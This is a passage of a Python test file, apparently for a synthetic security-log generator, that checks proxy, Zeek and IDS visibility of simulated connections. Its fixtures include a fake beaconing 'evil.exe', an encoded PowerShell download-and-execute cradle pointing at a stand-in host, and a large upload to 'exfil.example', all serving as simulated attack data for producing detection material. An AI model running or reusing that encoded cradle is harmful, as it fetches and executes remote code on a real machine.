# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Explicit proxy generation and visibility tests."""

import random
from datetime import UTC, datetime, timedelta
from unittest.mock import Mock

from evidenceforge.events.contexts import FirewallContext, HttpContext, IdsContext, ProxyContext
from evidenceforge.events.dispatcher import EventDispatcher
from evidenceforge.generation.activity import ActivityGenerator
from evidenceforge.generation.activity.dns_registry import resolve_domain_ip
from evidenceforge.generation.network_visibility import NetworkVisibilityEngine
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import (
    NetworkConfig,
    NetworkSegment,
    NetworkSensor,
    System,
    User,
)


def test_proxy_user_agent_selection_is_role_aware_for_servers():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    rng = random.Random(42)
    web_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    user_agents = {pick_proxy_user_agent(rng, web_server) for _ in range(50)}

    assert user_agents
    assert all("Mozilla/" not in ua for ua in user_agents)
    assert any(token in ua for ua in user_agents for token in ("curl", "Wget", "requests"))


def test_server_proxy_package_user_agents_are_destination_aware():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    generic_rng = random.Random(7)
    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    generic_user_agents = {
        pick_proxy_user_agent(generic_rng, ubuntu_server, hostname="login.microsoftonline.com")
        for _ in range(100)
    }
    package_tokens = ("apt", "APT", "dnf", "Fedora")
    assert all(
        not any(token in user_agent for token in package_tokens)
        for user_agent in generic_user_agents
    )

    package_rng = random.Random(11)
    package_user_agents = {
        pick_proxy_user_agent(package_rng, ubuntu_server, hostname="archive.ubuntu.com")
        for _ in range(40)
    }
    assert package_user_agents
    assert all("apt" in user_agent.lower() for user_agent in package_user_agents)
    assert all("Fedora" not in user_agent for user_agent in package_user_agents)


def test_server_proxy_package_user_agents_match_os_family():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    fedora_server = System(
        hostname="app01",
        ip="10.0.3.30",
        os="Fedora Linux 39",
        type="server",
        roles=["app_server"],
    )
    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    fedora_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            fedora_server,
            hostname="download.fedoraproject.org",
        )
        for seed in range(20)
    }
    ubuntu_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            ubuntu_server,
            hostname="download.fedoraproject.org",
        )
        for seed in range(20)
    }

    assert fedora_user_agents == {"libdnf (Fedora Linux 39; server; Linux.x86_64)"}
    assert all("Fedora" not in user_agent for user_agent in ubuntu_user_agents)


def test_workstation_package_user_agents_are_destination_aware():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    ubuntu_workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    generic_user_agents = {
        pick_proxy_user_agent(random.Random(seed), ubuntu_workstation, hostname="www.github.com")
        for seed in range(40)
    }
    package_tokens = ("apt", "APT", "dnf", "Fedora")
    assert all(
        not any(token in user_agent for token in package_tokens)
        for user_agent in generic_user_agents
    )

    package_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            ubuntu_workstation,
            hostname="archive.ubuntu.com",
        )
        for seed in range(20)
    }
    assert package_user_agents
    assert all("apt" in user_agent.lower() for user_agent in package_user_agents)


def test_proxy_user_agent_overlay_adds_package_family(tmp_path, monkeypatch):
    import yaml

    from evidenceforge.generation.activity.proxy_user_agents import (
        pick_proxy_user_agent,
        reset_proxy_user_agents_cache,
    )

    overlay_dir = tmp_path / ".eforge" / "config" / "activity"
    overlay_dir.mkdir(parents=True)
    overlay_path = overlay_dir / "proxy_user_agents.yaml"
    overlay_path.write_text(
        yaml.safe_dump(
            {
                "server": {
                    "package_managers": {
                        "custom_deb": {
                            "os_keywords": ["ubuntu"],
                            "hosts": ["updates.example.test"],
                            "user_agents": ["CustomPkg/1.0"],
                        }
                    }
                }
            },
            sort_keys=False,
        )
    )
    monkeypatch.chdir(tmp_path)
    reset_proxy_user_agents_cache()

    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    try:
        user_agent = pick_proxy_user_agent(
            random.Random(5),
            ubuntu_server,
            hostname="updates.example.test",
        )
    finally:
        reset_proxy_user_agents_cache()

    assert user_agent == "CustomPkg/1.0"


def test_server_ids_http_traffic_keeps_server_proxy_user_agent():
    generator, emitters = _generator(
        [
            NetworkSensor(
                type="network",
                name="dmz-tap",
                monitoring_segments=["dmz"],
                direction="bidirectional",
                log_formats=["zeek"],
            )
        ]
    )
    web_server = System(
        hostname="WEB-01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )
    generator._ip_to_system[web_server.ip] = web_server
    generator._proxy_routes[web_server.ip] = [generator._ip_to_system["10.0.3.10"]]

    generator.generate_connection(
        src_ip=web_server.ip,
        dst_ip="93.184.216.34",
        time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
        dst_port=80,
        proto="tcp",
        service="http",
        duration=1.0,
        orig_bytes=500,
        resp_bytes=5000,
        source_system=web_server,
        hostname="example.com",
        conn_state="SF",
        ids=IdsContext(
            sid=2013028,
            message="ET POLICY Suspicious HTTP Activity",
            classification="policy-violation",
            priority=2,
        ),
    )

    proxy_event = emitters["proxy_access"].emit.call_args.args[0]
    assert proxy_event.proxy.client_ip == web_server.ip
    assert "Mozilla/" not in proxy_event.proxy.user_agent
    assert proxy_event.proxy.user_agent


def _system(
    hostname: str,
    ip: str,
    roles: list[str] | None = None,
    assigned_user: str | None = None,
) -> System:
    return System(
        hostname=hostname,
        ip=ip,
        os="Linux Ubuntu 22.04" if roles and "forward_proxy" in roles else "Windows 11",
        type="server" if roles and "forward_proxy" in roles else "workstation",
        assigned_user=assigned_user,
        roles=roles or [],
    )


def _emitters() -> dict[str, Mock]:
    emitters = {
        "zeek_conn": Mock(),
        "zeek_dns": Mock(),
        "zeek_http": Mock(),
        "zeek_ssl": Mock(),
        "proxy_access": Mock(),
        "snort_alert": Mock(),
        "cisco_asa": Mock(),
    }
    emitters["zeek_conn"].can_handle.side_effect = lambda event: event.network is not None
    emitters["zeek_dns"].can_handle.side_effect = lambda event: event.dns is not None
    emitters["zeek_http"].can_handle.side_effect = lambda event: event.http is not None
    emitters["zeek_ssl"].can_handle.side_effect = lambda event: event.ssl is not None
    emitters["proxy_access"].can_handle.side_effect = lambda event: event.proxy is not None
    emitters["snort_alert"].can_handle.side_effect = lambda event: event.ids is not None
    emitters["cisco_asa"].can_handle.side_effect = lambda event: event.network is not None
    return emitters


def _generator(sensors: list[NetworkSensor]) -> tuple[ActivityGenerator, dict[str, Mock]]:
    workstation = _system("WKS-01", "10.0.1.10", assigned_user="alex.morgan")
    proxy = _system("PROXY-01", "10.0.3.10", ["forward_proxy"])
    systems = [workstation, proxy]
    network = NetworkConfig(
        segments=[
            NetworkSegment(
                name="workstations",
                cidr="10.0.1.0/24",
                systems=["WKS-01"],
                exposure="internal",
            ),
            NetworkSegment(
                name="dmz",
                cidr="10.0.3.0/24",
                systems=["PROXY-01"],
                exposure="both",
            ),
        ],
        sensors=sensors,
    )
    visibility = NetworkVisibilityEngine(network, systems)
    state_manager = StateManager()
    state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    emitters = _emitters()
    dispatcher = EventDispatcher(state_manager, emitters, visibility_engine=visibility)
    generator = ActivityGenerator(
        state_manager,
        emitters,
        network_visibility=visibility,
        dispatcher=dispatcher,
    )
    generator._ip_to_system = {system.ip: system for system in systems}
    generator._proxy_routes = {workstation.ip: [proxy]}
    generator._proxy_mode = "explicit"
    generator._proxy_listener_port = 8080
    generator._ad_domain = "example.org"
    return generator, emitters


def _seed_proxy_client_user_session(generator: ActivityGenerator) -> tuple[User, int, int]:
    user = User(
        username="alex.morgan",
        full_name="Alex Morgan",
        email="alex.morgan@example.org",
    )
    generator._users_by_username = {user.username: user}
    workstation = generator._ip_to_system["10.0.1.10"]
    start_time = datetime(2024, 1, 15, 9, 45, 0, tzinfo=UTC)
    generator.state_manager.set_current_time(start_time)
    logon_id = generator.state_manager.create_session(
        username=user.username,
        system=workstation.hostname,
        logon_type=2,
        source_ip=workstation.ip,
    )
    svchost_pid = generator.state_manager.create_process(
        system=workstation.hostname,
        parent_pid=4,
        image=r"C:\Windows\System32\svchost.exe",
        command_line="svchost.exe -k netsvcs",
        username="NETWORK SERVICE",
        integrity_level="System",
        logon_id="0x3e4",
    )
    explorer_pid = generator.state_manager.create_process(
        system=workstation.hostname,
        parent_pid=4,
        image=r"C:\Windows\explorer.exe",
        command_line="explorer.exe",
        username=user.username,
        integrity_level="Medium",
        logon_id=logon_id,
    )
    session = generator.state_manager.get_session(logon_id)
    assert session is not None
    session.explorer_pid = explorer_pid
    generator._system_pids = {
        workstation.hostname: {
            "svchost_netsvcs": svchost_pid,
            "explorer": explorer_pid,
        }
    }
    generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    return user, svchost_pid, explorer_pid


def _conn_pairs(emitters: dict[str, Mock]) -> list[tuple[str, str, int]]:
    return [
        (
            call.args[0].network.src_ip,
            call.args[0].network.dst_ip,
            call.args[0].network.dst_port,
        )
        for call in emitters["zeek_conn"].emit.call_args_list
    ]


class TestExplicitProxyVisibility:
    """Explicit proxy mode emits concrete legs, not the logical direct connection."""

    def test_client_side_sensor_sees_client_to_proxy_only(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.method == "CONNECT"
        assert proxy_event.proxy.host == "example.com"
        assert proxy_event.proxy.cs_bytes > 0
        assert proxy_event.proxy.sc_bytes > 0
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.request_body_len == 0
        assert http_event.http.response_body_len == 0
        conn_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].event_type == "connection" and call.args[0].network.dst_port == 8080
        )
        assert conn_event.network.orig_bytes >= proxy_event.proxy.cs_bytes
        assert conn_event.network.resp_bytes >= proxy_event.proxy.sc_bytes
        assert conn_event.network.orig_bytes >= proxy_event.proxy.cs_bytes + 500
        assert conn_event.network.resp_bytes >= proxy_event.proxy.sc_bytes + 5000
        assert conn_event.network.resp_pkts > 0
        assert not emitters["zeek_ssl"].emit.called

    def test_browser_proxy_user_agent_uses_user_process_instead_of_svchost(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, svchost_pid, _ = _seed_proxy_client_user_session(generator)
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
                    "Gecko/20100101 Firefox/121.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=svchost_pid,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            process_image=r"C:\Windows\System32\svchost.exe",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.pid != svchost_pid
        assert client_event.process.username == user.username
        assert client_event.process.image.endswith(r"\Mozilla Firefox\firefox.exe")

    def test_browser_proxy_user_agent_preserves_valid_storyline_process(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        evil_image = r"C:\Users\alex.morgan\AppData\Roaming\evil.exe"
        storyline_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=evil_image,
            command_line=r'"C:\Users\alex.morgan\AppData\Roaming\evil.exe" --beacon',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="cdn-assets-update.com:443",
                host="cdn-assets-update.com",
                status_code=200,
                sc_bytes=4800,
                cs_bytes=420,
                time_taken=1200,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/121.0.0.0 Safari/537.36"
                ),
                content_type="text/plain",
                cache_result="MISS",
                referrer="",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="45.33.32.30",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=storyline_pid,
            source_system=workstation,
            hostname="cdn-assets-update.com",
            conn_state="SF",
            process_image=evil_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == storyline_pid
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.username == user.username
        assert client_event.process.image == evil_image

    def test_matching_caller_proxy_process_is_preserved_for_storyline_download(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        powershell_image = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 58, 0, tzinfo=UTC))
        stale_user_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=powershell_image,
            command_line=(
                "powershell.exe -NoProfile -Command "
                "\"Invoke-WebRequest -Proxy 'http://PROXY-01.example.org:8080' "
                "-Uri 'https://cdn-assets-update.com/' -UseBasicParsing\""
            ),
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        storyline_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=4,
            image=powershell_image,
            command_line=(
                "powershell.exe -NoProfile -EncodedCommand "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
                "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AH"
                "AAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgBjAG8A"
                "bQAvAGgAZQBhAGwAdABoAC4AcABzADEAIgApAA=="
            ),
            username="SYSTEM",
            integrity_level="System",
            logon_id="0x3e7",
        )
        assert stale_user_pid != storyline_pid
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://cdn-assets-update.com/health.ps1",
                host="cdn-assets-update.com",
                status_code=200,
                sc_bytes=4800,
                cs_bytes=420,
                time_taken=1200,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                content_type="text/plain",
                cache_result="MISS",
                referrer="",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="45.33.32.30",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=storyline_pid,
            source_system=workstation,
            hostname="cdn-assets-update.com",
            conn_state="SF",
            process_image=powershell_image,
            http=HttpContext(
                method="GET",
                host="cdn-assets-update.com",
                uri="/health.ps1",
                version="1.1",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["text/plain"],
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == storyline_pid
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.username == "SYSTEM"
        assert client_event.process.command_line.endswith("AA==")

    def test_one_shot_proxy_client_process_starts_near_request_time(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        proxy = generator._ip_to_system["10.0.3.10"]
        generator._explicit_proxy_client_process_hint = Mock(
            return_value=(
                r"C:\Windows\System32\curl.exe",
                'curl.exe --proxy http://PROXY-01.example.org:8080 "https://www.bing.com/"',
            )
        )
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        pid, image = generator._ensure_explicit_proxy_client_process(
            source_system=workstation,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="www.bing.com:443",
                host="www.bing.com",
                status_code=200,
                user_agent="curl/8.4.0",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
        )

        proc = generator.state_manager.get_process(workstation.hostname, pid)
        assert image == r"C:\Windows\System32\curl.exe"
        assert proc is not None
        lead_seconds = (request_time - proc.start_time).total_seconds()
        assert 0 < lead_seconds <= 8.0

    def test_one_shot_proxy_client_process_terminates_after_request(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        generator._explicit_proxy_client_process_hint = Mock(
            return_value=(
                r"C:\Windows\System32\curl.exe",
                'curl.exe --proxy http://PROXY-01.example.org:8080 "https://www.bing.com/"',
            )
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="www.bing.com:443",
                host="www.bing.com",
                status_code=200,
                user_agent="curl/8.4.0",
                proxy_fqdn="PROXY-01.example.org",
                cache_result="MISS",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=workstation,
            hostname="www.bing.com",
            conn_state="SF",
        )

        active_images = [
            proc.image
            for proc in generator.state_manager.get_processes_on_system(workstation.hostname)
        ]
        assert r"C:\Windows\System32\curl.exe" not in active_images

    def test_documentation_ip_with_external_hostname_routes_through_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="203.0.113.45",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=3000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="dynsync-update.net",
            http=HttpContext(
                method="GET",
                host="dynsync-update.net",
                uri="/jquery-3.3.1.min.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                status_code=200,
                status_msg="OK",
            ),
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        origin_ip = resolve_domain_ip("dynsync-update.net", src_host="PROXY-01")
        assert ("10.0.3.10", origin_ip, 80) in pairs
        assert ("10.0.1.10", "203.0.113.45", 80) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.host == "dynsync-update.net"
        assert proxy_event.proxy.method == "GET"

    def test_auto_generated_proxy_get_has_no_zeek_request_body(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "GET"
        assert http_event.http.request_body_len == 0
        assert http_event.network.orig_bytes > 0

    def test_egress_sensor_sees_proxy_to_origin_only(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert any(pair[0] == "10.0.3.10" and pair[2] == 53 for pair in pairs)
        assert ("10.0.3.10", origin_ip, 443) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        assert emitters["zeek_dns"].emit.called
        assert emitters["zeek_ssl"].emit.called

    def test_sensor_monitoring_both_sides_sees_both_proxy_legs(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", origin_ip, 443) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs

    def test_https_miss_propagates_http_size_to_origin_tls_leg(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://example.com/jquery.js",
                host="example.com",
                status_code=200,
                sc_bytes=107_200,
                cs_bytes=620,
                time_taken=400,
                user_agent="Mozilla/5.0",
                content_type="application/javascript",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/jquery.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=107_000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/javascript"],
            ),
        )

        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        egress_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_events
        assert egress_events[0].network.resp_bytes >= 107_000
        client_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        ]
        assert client_events
        assert egress_events[0].timestamp > client_events[0].timestamp
        client_close = client_events[0].timestamp + timedelta(
            seconds=client_events[0].network.duration
        )
        assert egress_events[0].timestamp < client_close
        egress_http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_http_events
        assert egress_http_events[0].http.host == "example.com"
        assert egress_http_events[0].http.uri == "/jquery.js"
        assert egress_http_events[0].http.user_agent == "Mozilla/5.0"

    def test_inspected_https_upload_client_leg_does_not_double_count_request_body(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        request_bytes = 268_435_456
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="POST",
                url="https://exfil.example/upload",
                host="exfil.example",
                status_code=200,
                sc_bytes=900,
                cs_bytes=request_bytes + 313,
                time_taken=1200,
                user_agent="curl/8.1.2",
                content_type="application/octet-stream",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=12.0,
            orig_bytes=request_bytes,
            resp_bytes=512,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="exfil.example",
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="exfil.example",
                uri="/upload",
                version="1.1",
                user_agent="curl/8.1.2",
                request_body_len=request_bytes,
                response_body_len=512,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/octet-stream"],
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert client_event.network.orig_bytes > proxy_event.proxy.cs_bytes
        assert client_event.network.orig_bytes < request_bytes * 2

    def test_allowed_proxy_miss_origin_leg_is_established_when_state_is_implicit(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=107_200,
